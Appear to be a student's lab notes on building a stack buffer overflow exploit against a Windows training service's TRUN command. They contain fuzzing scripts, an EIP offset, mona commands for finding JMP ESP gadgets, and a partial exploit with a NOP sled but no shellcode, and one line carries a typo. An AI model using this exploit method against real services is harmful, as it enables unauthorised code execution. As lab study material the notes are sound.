### Bruh.
```bash
#scp to download stuff from the jump  box ran on windowss
scp 10.50.11.132:/home/student/192.168.28.111/longTermStorage/essfunc.dll .
Run as administrator: (File using: secureserverind.exe)
Get-Process | findstr /i secure
Pid = 11228
netstat -anop tcp | findstr 11228
*Listening on 9999
#Create new python script. We want to see what the HELP does in place of the buff, ultimatley utilizing the TRUN command.
Original:
#!/usr/bin/python
import socket

### FUZZ ###
buf = ""
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Create IPv4 socket, TCP protocol
s.connect (("10.50.179.49", 9999)) #Connect to target IP and port
print s.recv(1024) #Print response 
s.send(buf) #Send the value of buf
print s.recv(1024) #Print response
s.close() #close the socket.

Edit script: WE WANT THIS
#!/usr/bin/python
import socket

### FUZZ ###
buf = "TRUN /.;/"
buf += "A" * 100
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Create IPv4 socket, TCP protocol
s.connect (("10.50.179.49", 9999)) #Connect to target IP and port
print s.recv(1024) #Print response 
s.send(buf) #Send the value of buf
print s.recv(1024) #Print response
s.close() #close the socket.
#CPONTINUE TO EDIT THIS

### FUZZ ###
buf = "TRUN /.:/"
buf += "A" * 1000
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Create IPv4 socket, TCP protocol
s.connect (("10.50.179.49", 9999)) #Connect to target IP and port
print s.recv(1024) #Print response 
s.send(buf) #Send the value of buf
print s.recv(1024) #Print response
s.close() #close the socket.


### It worked once we upped the overflow to 3000.
*Change the buf line to the wiremask.eu buffer overflow strin for 3000.
#Reset debugger, run again. A value in EIP appears, #386F4337, plug it into wiremask offset generator
#Offset is 2003
buf += "A" * 2003 # offset
buf += "BBBB" # show we hit our EIP. (424242)

#Next, In debugger, run these:
!mona modules #Find unprotected DLLS
!mona jmp -r esp -m "essfunc.dll" #Search for JMP ESP with unprotected DLL.
*Go to windows, Log data, to find the actual log of addresses we will copy down.
  0x625012a0 > |xa0|x12|x50|x62
  0x625012ad > |xad|x12|x50|x62
  0x625012ba > |xba|x12|x50|x62
  0x625012c7 > |xc7|x12|x50|x62
#Convert to little endian
#Change 'BBBB' in script to these, we may need to cycle.
#We must also add the NOP section to our script.
Updated:
### FUZZ ###
buf = "TRUN /.;/"
buf += "A" * 2003 # offset
buf += "\xa0\x12\x50\x62" # show we hit our EIP.
buf += "x90" * 10 # NOP
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Create IPv4 socket, TCP protocol
s.connect (("10.50.179.49", 9999)) #Connect to target IP and port
print s.recv(1024) #Print response 
s.send(buf) #Send the value of buf
print s.recv(1024) #Print response
s.close() #close the socket.


  
